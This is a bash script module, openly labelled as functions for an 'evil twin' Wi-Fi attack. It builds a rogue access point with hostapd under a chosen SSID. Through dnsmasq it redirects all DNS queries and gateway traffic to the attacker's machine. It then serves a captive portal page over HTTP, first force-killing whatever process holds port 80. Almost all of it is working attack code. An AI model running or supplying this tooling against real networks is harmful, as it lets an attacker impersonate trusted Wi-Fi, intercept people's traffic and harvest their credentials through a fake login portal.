#!/usr/bin/env bash

# AP functions for evil twin attack

# Create hostapd configuration
create_hostapd_conf() {
    local conf_file=$1
    local iface=$2
    local ssid=$3
    local channel=$4
    
    cat > "$conf_file" <<EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=$channel
ieee80211n=1
wmm_enabled=1
auth_algs=1
ignore_broadcast_ssid=0
EOF
}

# Start hostapd
start_hostapd() {
    local conf_file=$1
    local pid_file=$2
    
    log "Launching hostapd..."
    hostapd -B -P "$pid_file" "$conf_file"
    sleep 2
    
    # Check if hostapd started successfully
    if [[ ! -f "$pid_file" ]]; then
        error_exit "Failed to start hostapd"
    fi
}

# Create dnsmasq configuration
create_dnsmasq_conf() {
    local conf_file=$1
    local ap_ip=$2
    local dhcp_start=$3
    local dhcp_end=$4
    local dhcp_lease=$5
    
    cat > "$conf_file" <<EOF
domain-needed
bogus-priv
no-resolv
address=/#/$ap_ip
dhcp-range=$dhcp_start,$dhcp_end,$dhcp_lease
dhcp-option=3,$ap_ip
dhcp-option=6,$ap_ip
log-queries
log-dhcp
EOF
}

# Start dnsmasq
start_dnsmasq() {
    local conf_file=$1
    local iface=$2
    local pid_file=$3
    
    log "Launching dnsmasq..."
    dnsmasq \
        --conf-file="$conf_file" \
        --interface="$iface" \
        --except-interface=lo \
        --bind-interfaces \
        --pid-file="$pid_file" \
        --dhcp-authoritative
    
    sleep 2
    
    # Check if dnsmasq started successfully
    if [[ ! -f "$pid_file" ]]; then
        error_exit "Failed to start dnsmasq"
    fi
}

# Start HTTP server
start_http_server() {
    local portal_dir=$1
    local ap_ip=$2
    local log_file=$3
    local pid_file=$4
    
    log "Starting HTTP server from: $portal_dir"
    
    # Check if port 80 is already in use
    if lsof -i :80 -sTCP:LISTEN >/dev/null 2>&1; then
        log "Warning: Port 80 is already in use, attempting to kill processes..."
        fuser -k 80/tcp 2>/dev/null || true
        sleep 2
    fi
    
    (
        cd "$portal_dir" || error_exit "Failed to change to portal directory"
        python3 -u -m http.server 80 --bind "$ap_ip" >"$log_file" 2>&1 &
        echo $! > "$pid_file"
    )
    
    sleep 3
    
    # Check if HTTP server started successfully
    if [[ ! -f "$pid_file" ]]; then
        error_exit "Failed to start HTTP server"
    fi
    
    # Additional check to see if the server is actually listening
    local pid=$(cat "$pid_file")
    if ! kill -0 "$pid" 2>/dev/null; then
        error_exit "HTTP server process died immediately after starting"
    fi
    
    log "HTTP server started successfully (PID: $(cat "$pid_file"))"
}